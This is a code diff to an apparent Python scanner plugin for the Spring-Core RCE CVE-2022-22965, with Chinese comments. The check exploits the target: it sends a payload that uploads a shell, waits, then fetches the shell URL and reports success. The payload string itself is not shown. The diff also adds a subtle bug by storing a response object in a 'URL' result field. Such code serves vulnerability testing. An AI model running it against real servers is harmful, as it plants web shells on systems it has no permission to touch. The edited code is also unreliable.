@@ -16,7 +16,7 @@ from configs.custom_headers import USER_AGENTS, TIMEOUT
 requests.packages.urllib3.disable_warnings()
 
 
-def check(target_url, proxies=None):
+def check(target_url, proxies):
     """
     对给定的目标URL检测Spring-Core RCE漏洞。
 
@@ -44,10 +44,11 @@ def check(target_url, proxies=None):
     target_url = format_url(target_url, "http")
 
     try:
+        url_with_payload = target_url + arg_payload
         if proxies:
-            requests.get(target_url + arg_payload, headers=headers, verify=False, timeout=TIMEOUT, proxies=proxies)
+            requests.get(url_with_payload, headers=headers, verify=False, timeout=TIMEOUT, proxies=proxies)
         else:
-            requests.get(target_url + arg_payload, headers=headers, verify=False, timeout=TIMEOUT)
+            requests.get(url_with_payload, headers=headers, verify=False, timeout=TIMEOUT)
 
         # 等待上传完成
         time.sleep(10)
@@ -58,9 +59,9 @@ def check(target_url, proxies=None):
         if shell_response.status_code == 200:
             return True, {
                 "CVE_ID": "CVE-2022-22965",
-                "URL": target_url,
+                "URL": shell_url,
                 "Details": f"检测到CVE-2022-22965的RCE漏洞",
-                "Response": shell_response.json()
+                "Response": shell_response.text[:20] + "......"
             }
         else:
             parsed_url = urlparse(shell_url)
@@ -71,9 +72,9 @@ def check(target_url, proxies=None):
             if shell_response_root.status_code == 200:
                 return True, {
                     "CVE_ID": "CVE-2022-22965",
-                    "URL": target_url,
+                    "URL": shell_response_root,
                     "Details": f"检测到CVE-2022-22965的RCE漏洞",
-                    "Response": shell_response.json()
+                    "Response": shell_response.text[:20] + "......"
                 }
             else:
                 return False, {
@@ -91,5 +92,5 @@ def check(target_url, proxies=None):
 
 if __name__ == "__main__":
     target = "http://localhost:8080/"
-    is_vulnerable, result = check(format_url(target, "http"))
+    is_vulnerable, result = check(target, proxies="")
     print(result)
